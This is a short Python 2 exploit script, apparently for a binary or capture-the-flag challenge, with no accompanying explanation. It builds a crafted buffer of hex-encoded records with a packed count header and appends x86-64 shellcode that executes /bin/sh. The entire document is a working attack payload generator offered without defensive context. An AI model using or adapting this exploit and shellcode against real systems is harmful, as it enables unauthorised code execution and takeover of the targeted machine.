#!/usr/bin/python

import struct
import os,sys

buff = "00000000000000000000000021498201".decode("hex")
buff+= "00000000000000000000000087014200".decode("hex")
buff+= "0000000000000000000000005b972701".decode("hex")
buff+= "00000000000000000000000041160500".decode("hex")
buff+= "00000000000000000000000021498201".decode("hex")
buff+= "0000000000000000000000007b3e0701".decode("hex")
buff+= "000000000000000000000000f9252fdc".decode("hex")
buff+= "00000000000000000000000032680200".decode("hex")

shellcode =     "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"                                     			# syscall


payload = "%s%s"%(struct.pack("<I",len(buff)/16),buff)+shellcode
print len(payload)
